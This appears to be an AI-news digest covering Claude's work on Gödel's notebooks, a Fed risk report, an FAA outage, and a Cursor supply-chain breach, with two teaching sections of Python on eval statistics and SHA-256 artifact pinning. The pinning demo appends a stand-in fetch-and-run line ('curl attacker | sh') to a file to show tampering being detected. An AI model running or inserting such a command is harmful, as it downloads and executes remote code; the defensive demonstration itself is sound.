tldr: Claude produced a ~650-page analysis of Kurt Gödel's shorthand notebooks in days, identifying 663 theorems with proofs or sketches, about 400 of them since checked without corrections. The Helsinki team had been transcribing at about a page a week.

The Nvidia fallout widened: Altimeter and Atreides (~$2.13B stake) asked the board to keep Huang's return open, Musk backed a 100,000-signature petition, and bipartisan senators pressed Commerce Secretary Lutnick over the export-control loopholes Megaspeed allegedly used.

The Fed's Financial Stability Report found 87% of surveyed market contacts now name AI as a top risk (up from 50% in spring), citing $680B of AI-compute debt issuance. The FAA is also examining whether a newly expanded AI traffic tool played a role in Thursday's nationwide ground stop.

items.title: Claude helps decode Gödel's shorthand notebooks, finding 663 theorems with proofs or sketches
items.summary: Since 2017, Jan von Plato's University of Helsinki project has been transcribing 16 notebooks Kurt Gödel wrote in the early 1940s, mostly in the obsolete Gabelsberger shorthand. The team had been working at about a page a week. Then, in September, Anthropic's Claude produced a roughly 650-page analysis within days. It identified 663 theorems for which Gödel had a proof, a sketch or an outline, and about 400 of them were later checked without corrections. The notebooks suggest Gödel came within one step of the independence of the axiom of choice, which Paul Cohen proved in 1963.
items.why_it_matters: This is a concrete case of a frontier model speeding up archival and mathematical scholarship by orders of magnitude. It also raises an open attribution question: how much of the result is Gödel's work and how much is the model's repair of gaps.

items.title: Fed Financial Stability Report: 87% of surveyed market contacts now name AI as a top risk
items.summary: The Federal Reserve's November 2026 Financial Stability Report, released Nov 13, found that 87% of the 23 market contacts surveyed named AI as a salient risk, up from 50% in spring 2026 and 30% in fall 2025. The concerns fall into three groups: stretched equity valuations, AI-enabled cyber risk, and complex AI-infrastructure financing. The report puts debt issuance tied to advanced computing at $680B by October 2026 and says not-yet-commenced debt, guarantees and leases on AI infrastructure could exceed $3T. It also flags hedge-fund leverage at its highest since 2013.
items.why_it_matters: US bank regulators now treat AI data-centre financing as a system-level risk. The report lands in a week when Nvidia's guarantees and the Anthropic IPO dominate markets.

items.title: FAA examines whether new AI air-traffic tool played a role in nationwide ground stop; Duffy says it did not
items.summary: The FAA halted departures nationwide on Nov 13 after a communications failure at its air-traffic control centres, three days after it expanded SMART, an AI traffic-management advisory tool from Air Space Intelligence, to all 22 en-route centres. Federal officials said they were examining whether the tool contributed. Transportation Secretary Sean Duffy and the vendor said SMART is not connected to core radar and flight-tracking systems and could not have caused the outage. Bloomberg reported that the FBI does not suspect a cyberattack and is looking at whether a software update was to blame.
items.why_it_matters: It is the first big public test of AI tools in safety-critical federal infrastructure. Even if the tool is cleared, the episode is likely to feed scrutiny of the agency's AI rollouts.

items.title: OpenAI disbands its standalone robotics team, betting general models like GPT-6 Astra can run robots
items.summary: Fortune reported in an exclusive that OpenAI has broken up its standalone robotics team. The robotics researchers now report to Chief Research Officer Mark Chen in the main research organisation, and the applied robotics and hardware staff have moved to the Applied group under President Greg Brockman. items.title: Cursor traces its breach to a key leaked by Fireworks AI; tampered Claude Code extension reached up to 5,000 users
items.summary: Cursor published the findings of its two-week investigation. An attacker used a Cursor access key exposed in the Fireworks AI breach to copy historical coding-agent traces and credentials, then reached some of Cursor's SaaS tools. A stolen credential let the attacker plant tampered copies of Anthropic's Claude Code extension (versions 2.1.312 and 2.1.313) in Cursor's VS Code marketplace cache for about 11 hours. Up to 5,000 users may have installed them, and researchers say the payload installed SSH backdoors. Cursor says fewer than 0.01% of customers had API credentials exposed, Privacy Mode prompts and code were not in the stolen data, and the last attacker activity it saw was on Nov 1.
items.why_it_matters: The Fireworks breach has now spread into a supply-chain attack on a major AI coding tool. Inference providers that hold customer keys and traces are a systemic weak point for the agent and dev-tool stack.
key_numbers: <0.01% of customers had API credentials exposed

items.title: Ai2's XYBench finds LLMs answer the literal question over the user's real goal
items.summary: Ai2 released XYBench (EMNLP 2026), 8,115 queries built around a buried misconception (the 'XY problem'), drawn from Stack Overflow/Stack Exchange and WikiHow. It tested Claude Sonnet 4.6, GPT-5, Gemini 3.1 Pro, Qwen3.5-9B and DeepSeek-V4 Pro. Every model favoured the stated request: on Stack Overflow, 59–71% of answers included a fix for the underlying goal, but only 35–41% made it the focus. In multiple choice, models picked the goal-focused answer 71–84% of the time, so Ai2 frames the gap as a post-training and product-design issue, not a knowledge gap.
items.why_it_matters: The benchmark measures a practical helpfulness failure that leaderboards miss, and the gap between recognising the right answer and generating it points to fixes at the post-training stage.

learn.title: Report an eval pass rate with an interval, and compare setups with a paired test
learn.why_today: Anthropic's eval guidance urges reporting uncertainty, and coverage highlights one model scoring 60% via the API and 94% on claude.ai on the same self-harm eval.
learn.explanation: A pass rate from n graded transcripts is a binomial estimate, so publish an interval, not a point. The Wilson score interval behaves well near 0% and 100% and at small n, where the normal approximation p ± 1.96√(p(1−p)/n) can leave [0,1]. To ask whether two setups differ, a two-proportion z-test works for independent samples. When the same prompts are run under both setups, use McNemar's test on the discordant pairs instead, because only prompts whose outcome flips carry information and pairing removes prompt-difficulty variance. The limits: these intervals cover sampling noise only. They say nothing about grader error, prompt-set coverage or whether the construct is the right one, which is why the guidance also asks for grader validation against humans.
learn.python:
# Report a safety-eval pass rate with its uncertainty, and test two setups (illustrative numbers)
import math
def wilson(k, n, z=1.96):
    p = k / n
    den = 1 + z * z / n
    c = (p + z * z / (2 * n)) / den
    h = z * math.sqrt(p * (1 - p) / n + z * z / (4 * n * n)) / den
    return c - h, c + h
def two_prop_z(k1, n1, k2, n2):
    p1, p2 = k1 / n1, k2 / n2
    p = (k1 + k2) / (n1 + n2)
    se = math.sqrt(p * (1 - p) * (1 / n1 + 1 / n2))
    return (p2 - p1) / se
for n in (20, 50, 200):
    k_api, k_app = round(0.60 * n), round(0.94 * n)   # same model, two deployment setups
    lo1, hi1 = wilson(k_api, n); lo2, hi2 = wilson(k_app, n)
    z = two_prop_z(k_api, n, k_app, n)
    print(f"n={n:4d}  API {k_api/n:.0%} [{lo1:.0%},{hi1:.0%}]  app {k_app/n:.0%} [{lo2:.0%},{hi2:.0%}]  z={z:.2f}")
# Same transcripts graded in both setups? Prefer a paired test (McNemar) on the discordant pairs b, c.
b, c = 4, 38            # illustrative: fail->pass 38 times, pass->fail 4 times
print("McNemar chi2 =", round((abs(b - c) - 1) ** 2 / (b + c), 1))

learn.title: Pin dev-tool artifacts by SHA-256 and verify before install
learn.why_today: Cursor says a stolen credential let an attacker plant tampered Claude Code extension builds in its marketplace cache for about 11 hours, reaching up to 5,000 users.
learn.explanation: A version number names a release but does not bind its bytes: whoever controls a registry, mirror or cache can serve different content under the same name. Recording a cryptographic hash when you first review an artifact, and refusing to install anything whose hash differs, turns 'same version' into 'same bytes'. SHA-256 is collision- and second-preimage-resistant, so an attacker cannot practically craft a malicious file with the pinned digest. Lockfiles in pip (--require-hashes), npm and Nix apply the same idea to dependencies, and agent harnesses that auto-install tools should do the same. The limit: a hash only proves the bytes match what you reviewed. If the first copy was already malicious, or the publisher's key is stolen, you need signatures checked against keys obtained out of band, plus review.
learn.python:
# Verify a downloaded artifact against a pinned SHA-256 before installing it (illustrative)
import hashlib, hmac, os, tempfile
def sha256_file(path, chunk=1 << 16):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for block in iter(lambda: f.read(chunk), b""):
            h.update(block)
    return h.hexdigest()
def verify(path, pinned_hex):
    return hmac.compare_digest(sha256_file(path), pinned_hex)
tmp = tempfile.mkdtemp()
good = os.path.join(tmp, "ext-2.1.0.vsix")
with open(good, "wb") as f:
    f.write(b"PK\x03\x04 legit extension bytes")
lockfile = {"ext-2.1.0.vsix": sha256_file(good)}   # recorded when you first reviewed it
print("pinned  :", lockfile["ext-2.1.0.vsix"][:16], "...")
print("verify original:", verify(good, lockfile["ext-2.1.0.vsix"]))
with open(good, "ab") as f:                         # a mirror/cache serves a tampered copy
    f.write(b"\n#!/bin/sh curl attacker | sh")
print("verify tampered:", verify(good, lockfile["ext-2.1.0.vsix"]))
# A hash proves the bytes match what you reviewed, not that they are safe; pair it with a
# publisher signature checked against a key you obtained out of band.
